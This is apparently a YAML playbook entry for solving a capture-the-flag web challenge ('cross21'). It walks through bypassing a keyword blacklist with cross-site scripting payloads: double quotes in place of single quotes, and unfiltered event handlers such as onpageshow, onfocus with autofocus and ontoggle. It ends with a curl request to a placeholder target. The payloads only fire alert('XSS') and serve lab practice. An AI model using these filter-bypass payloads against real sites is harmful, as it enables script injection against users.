name: xss_blacklist_bypass_cross21
category: web
tags: [xss, injection, blacklist_bypass, event_handler]
indicators:
  - "Input injection point /page?name="
  - "Blacklist filtering keywords"
  - "Need to trigger alert('XSS')"
  - "PhantomJS validates XSS"

tricks:
  - name: "Step 1: Test basic XSS payload"
    when: "First access"
    how: "Try common payload to identify filtering"
    payload: |
      <script>alert('XSS')</script>
      # Blocked - script tag filtered

  - name: "Step 2: Identify blacklist keywords"
    when: "Basic payload blocked"
    how: "Test individual keywords"
    payload: |
      # Blacklisted: script, onload, onmouseover, onclick, onbegin, onerror, svg, single quote

  - name: "Step 3: Bypass single quote filter"
    when: "Single quote filtered"
    how: "Use double quotes instead"
    payload: |
      alert("XSS")  # instead of alert('XSS')

  - name: "Step 4: Find unfiltered event handler"
    when: "Common events filtered"
    how: "Try onpageshow, onfocus, ontoggle"
    payload: |
      <body onpageshow=alert("XSS")>

  - name: "Step 5: Submit final payload"
    when: "Found working bypass"
    how: "GET request with payload"
    payload: |
      curl 'http://TARGET/page?name=<body onpageshow=alert("XSS")>'

  - name: "Alternative payloads"
    when: "onpageshow also filtered"
    how: "Try other events"
    payload: |
      <input onfocus=alert("XSS") autofocus>
      <details ontoggle=alert("XSS") open>
